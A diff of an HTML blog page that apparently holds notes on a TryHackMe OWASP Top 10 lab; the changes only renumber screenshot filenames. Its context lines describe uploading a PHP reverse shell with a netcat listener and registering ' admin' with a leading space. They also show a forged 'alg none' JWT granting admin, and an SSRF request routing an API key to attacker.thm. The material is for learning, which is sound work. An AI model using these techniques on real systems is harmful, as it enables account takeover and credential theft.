@@ -328,7 +328,7 @@ Pass: %<span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number
 
 <p>After logging in let’s try to add a new book and upload a php reverse shell </p>
 <p>→ Set the php reverse shell </p>
-<p><img src="/../owasp_img/27.png" alt="alt text"></p>
+<p><img src="/../owasp_img/Screenshot%202024-07-16%20at%2015.48.06.png" alt="alt text"></p>
 <p>→ start a netcat on port 4444 and let’s try to upload it </p>
 <p>Not working.. let’s try another exploit:</p>
 <p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47887">https://www.exploit-db.com/exploits/47887</a></p>
@@ -364,12 +364,12 @@ THM&#123;But_1ts_n0t_my_f4ult!&#125;
 <p>We will enter “ admin” without the quotes (notice the space at the start). </p>
 <p>Now when you enter that in the username field and enter other required information like email id or password and submit that data, it will register a new user, but that user will have the same right as the admin account. That new user will also be able to see all the content presented under the user admin.</p>
 <h3 id="Challange-1"><a href="#Challange-1" class="headerlink" title="Challange"></a>Challange</h3><p>Register a new user with the username “ darren“ with a space before :</p>
-<p><img src="/../owasp_img/28.png" alt="alt text"></p>
+<p><img src="/../owasp_img/27.png" alt="alt text"></p>
 <p>Found flags.</p>
 <h1 id="Software-and-Data-Integrity-Failures"><a href="#Software-and-Data-Integrity-Failures" class="headerlink" title="Software and Data Integrity Failures"></a>Software and Data Integrity Failures</h1><h2 id="What-is-Integrity"><a href="#What-is-Integrity" class="headerlink" title="What is Integrity?"></a>What is Integrity?</h2><p>When talking about integrity, we refer to the capacity we have to ascertain that a piece of data remains unmodified. Integrity is essential in cybersecurity as we care about maintaining important data free from unwanted or malicious modifications. For example, say you are downloading the latest installer for an application. How can you be sure that while downloading it, it wasn’t modified in transit or somehow got damaged by a transmission error?</p>
 <p>To overcome this problem, you will often see a hash sent alongside the file so that you can prove that the file you downloaded kept its integrity and wasn’t modified in transit. A hash or digest is simply a number that results from applying a specific algorithm over a piece of data. When reading about hashing algorithms, you will often read about MD5, SHA1, SHA256 or many others available. </p>
 <p>Let’s take WinSCP as an example to understand better how we can use hashes to check a file’s integrity. If you go to their Sourceforge repository, you’ll see that for each file available to download, there are some hashes published along:</p>
-<p><img src="/../owasp_img/29.png" alt="alt text"></p>
+<p><img src="/../owasp_img/28.png" alt="alt text"></p>
 <p>These hashes were precalculated by the creators of WinSCP so that you can check the file’s integrity after downloading. If we download the <code>WinSCP-5.21.5-Setup.exe</code> file, we can recalculate the hashes and compare them against the ones published in Sourceforge. To calculate the different hashes in Linux, we can use the following commands:</p>
 <pre><code class="hljs bash">user@attackbox$ <span class="hljs-built_in">md5sum</span> WinSCP-5.21.5-Setup.exe          
 20c5329d7fde522338f037a7fe8a84eb  WinSCP-5.21.5-Setup.exe
@@ -392,7 +392,7 @@ e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-
 <pre><code class="hljs bash">&lt;script src=<span class="hljs-string">&quot;https://code.jquery.com/jquery-3.6.1.min.js&quot;</span>&gt;&lt;/script&gt;</code></pre>
 
 <p>When a user navigates to your website, its browser will read its HTML code and download jQuery from the specified external source.</p>
-<p><img src="/../owasp_img/30.png" alt="alt text"></p>
+<p><img src="/../owasp_img/29.png" alt="alt text"></p>
 <p>The problem is that if an attacker somehow hacks into the jQuery official repository, they could change the contents of <a target="_blank" rel="noopener" href="https://code.jquery.com/jquery-3.6.1.min.js">https://code.jquery.com/jquery-3.6.1.min.js</a> to inject malicious code. As a result, anyone visiting your website would now pull the malicious code and execute it into their browsers unknowingly. This is a software integrity failure as your website makes no checks against the third-party library to see if it has changed. Modern browsers allow you to specify a hash along the library’s URL so that the library code is executed only if the hash of the downloaded file matches the expected value. This security mechanism is called Subresource Integrity (SRI), and you can read more about it here.</p>
 <p>The correct way to insert the library in your HTML code would be to use SRI and include an integrity hash so that if somehow an attacker is able to modify the library, any client navigating through your website won’t execute the modified version. Here’s how that should look in HTML:</p>
 <pre><code class="hljs bash">&lt;script src=<span class="hljs-string">&quot;https://code.jquery.com/jquery-3.6.1.min.js&quot;</span> integrity=<span class="hljs-string">&quot;sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=&quot;</span> crossorigin=<span class="hljs-string">&quot;anonymous&quot;</span>&gt;&lt;/script&gt;</code></pre>
@@ -401,13 +401,13 @@ e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-
 <p>What is the SHA-256 hash of <a target="_blank" rel="noopener" href="https://code.jquery.com/jquery-1.12.4.min.js">https://code.jquery.com/jquery-1.12.4.min.js</a>?</p>
 <p>Go to :<a target="_blank" rel="noopener" href="https://www.srihash.org/">https://www.srihash.org/</a> → paste the url there and copy the SHA-256 hash</p>
 <h2 id="Data-Integrity-Failures"><a href="#Data-Integrity-Failures" class="headerlink" title="Data Integrity Failures"></a>Data Integrity Failures</h2><p>Let’s think of how web applications maintain sessions. Usually, when a user logs into an application, they will be assigned some sort of session token that will need to be saved on the browser for as long as the session lasts. This token will be repeated on each subsequent request so that the web application knows who we are. These session tokens can come in many forms but are usually assigned via cookies. Cookies are key-value pairs that a web application will store on the user’s browser and that will be automatically repeated on each request to the website that issued them.</p>
-<p><img src="/../owasp_img/31.png" alt="alt text"></p>
+<p><img src="/../owasp_img/30.png" alt="alt text"></p>
 <p>For example, if you were creating a webmail application, you could assign a cookie to each user after logging in that contains their username. In subsequent requests, your browser would always send your username in the cookie so that your web application knows what user is connecting. </p>
 <p>This would be a terrible idea security-wise because, as we mentioned, cookies are stored on the user’s browser, so if the user tampers with the cookie and changes the username, they could potentially impersonate someone else and read their emails! </p>
 <p>This application would suffer from a data integrity failure, as it trusts data that an attacker can tamper with.</p>
 <h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><p>One solution to this is to use some integrity mechanism to guarantee that the cookie hasn’t been altered by the user. To avoid re-inventing the wheel, we could use some token implementations that allow you to do this and deal with all of the cryptography to provide proof of integrity without you having to bother with it. One such implementation is JSON Web Tokens (JWT).</p>
 <p>JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. The idea is that you can generate tokens that you can give your users with the certainty that they won’t be able to alter the key-value pairs and pass the integrity check. The structure of a JWT token is formed of 3 parts:</p>
-<p><img src="/../owasp_img/32.png" alt="alt text"></p>
+<p><img src="/../owasp_img/31.png" alt="alt text"></p>
 <p>The header contains metadata indicating this is a JWT, and the signing algorithm in use is HS256. </p>
 <p>The payload contains the key-value pairs with the data that the web application wants the client to store. </p>
 <p>The signature is similar to a hash, taken to verify the payload’s integrity. If you change the payload, the web application can verify that the signature won’t match the payload and know that you tampered with the JWT. </p>
@@ -423,18 +423,18 @@ e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-
 <li>Remove the signature part.</li>
 </ul>
 <p>Taking the JWT from before as an example, if we wanted to change the payload so that the username becomes “admin” and no signature check is done, we would have to decode the header and payload, modify them as needed, and encode them back. Notice how we removed the signature part but kept the dot at the end.</p>
-<p><img src="/../owasp_img/33.png" alt="alt text"></p>
-<h3 id="Challange-2"><a href="#Challange-2" class="headerlink" title="Challange:"></a>Challange:</h3><p><img src="/../owasp_img/34.png" alt="alt text"></p>
-<p><img src="/../owasp_img/35.png" alt="alt text"></p>
+<p><img src="/../owasp_img/32.png" alt="alt text"></p>
+<h3 id="Challange-2"><a href="#Challange-2" class="headerlink" title="Challange:"></a>Challange:</h3><p><img src="/../owasp_img/33.png" alt="alt text"></p>
+<p><img src="/../owasp_img/34.png" alt="alt text"></p>
 <p>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzE3NTI3MTczfQ.Tw6Yvjv0EIq7oV87-VwgKMy7nAgpryasvzRjWHv5B48</p>
 <p>Decode the header and change the alg to <code>none</code>:</p>
-<p><img src="/../owasp_img/36.png" alt="alt text"></p>
+<p><img src="/../owasp_img/35.png" alt="alt text"></p>
 <p>Do the same with the payload and change user to <code>admin</code> </p>
-<p><img src="/../owasp_img/37.png" alt="alt text"></p>
+<p><img src="/../owasp_img/36.png" alt="alt text"></p>
 <p>Now go back into the web app and paste the new JWT session:</p>
 <pre><code class="hljs bash">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE3NTI3MTczfQ==.</code></pre>
 
-<p><img src="/../owasp_img/38.png" alt="alt text"></p>
+<p><img src="/../owasp_img/37.png" alt="alt text"></p>
 <h1 id="Security-Logging-and-Monitoring-Failures"><a href="#Security-Logging-and-Monitoring-Failures" class="headerlink" title="Security Logging and Monitoring Failures"></a>Security Logging and Monitoring Failures</h1><p>When web applications are set up, every action performed by the user should be logged. Logging is important because, in the event of an incident, the attackers’ activities can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions were performed by an attacker if they gain access to particular web applications. The more significant impacts of these include:</p>
 <ul>
 <li>Regulatory damage: if an attacker has gained access to personally identifiable user information and there is no record of this, final users are affected, and the application owners may be subject to fines or more severe actions depending on regulations.</li>
@@ -460,7 +460,7 @@ e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-
 <p>Put this knowledge to practice by analysing the provided sample log file. You can download it by clicking the Download Task Files button at the top of the task.</p>
 <h1 id="Server-Side-Request-Forgery-SSRF"><a href="#Server-Side-Request-Forgery-SSRF" class="headerlink" title="Server-Side Request Forgery (SSRF)"></a>Server-Side Request Forgery (SSRF)</h1><p>This type of vulnerability occurs when an attacker can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services.</p>
 <p>Think, for example, of a web application that uses an external API to send SMS notifications to its clients. For each email, the website needs to make a web request to the SMS provider’s server to send the content of the message to be sent. Since the SMS provider charges per message, they require you to add a secret key, which they pre-assign to you, to each request you make to their API. The API key serves as an authentication token and allows the provider to know to whom to bill each message. The application would work like this:</p>
-<p><img src="/../owasp_img/37.png" alt="alt text"></p>
+<p><img src="/../owasp_img/38.png" alt="alt text"></p>
 <p>By looking at the diagram above, it is easy to see where the vulnerability lies. The application exposes the server parameter to the users, which defines the server name of the SMS service provider. If the attacker wanted, they could simply change the value of the server to point to a machine they control, and your web application would happily forward the SMS request to the attacker instead of the SMS provider. As part of the forwarded message, the attacker would obtain the API key, allowing them to use the SMS service to send messages at your expense. To achieve this, the attacker would only need to make the following request to your website:</p>
 <pre><code class="hljs bash">https://www.mysite.com/sms?server=attacker.thm&amp;msg=ABC</code></pre>
 
